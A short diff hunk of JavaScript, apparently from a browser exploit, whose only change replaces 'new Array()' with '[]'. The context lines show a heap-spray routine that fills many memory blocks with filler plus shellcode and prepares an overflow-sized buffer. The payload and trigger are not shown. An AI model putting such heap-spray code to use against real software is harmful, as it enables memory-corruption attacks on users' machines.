@@ -54,7 +54,7 @@ var buf_size = 128;
 
 while((filler.length * 2) < block_size) filler += filler;
 filler = filler.substring(0, block_size - shellcode.length);
-memory = new Array();
+memory = [];
 for(i = 0; i < blocks; i++) memory[i] = filler + shellcode;
 while(buf.length < (buf_size * 2)) buf += buf;
 buf = buf.substring(0, buf_size);
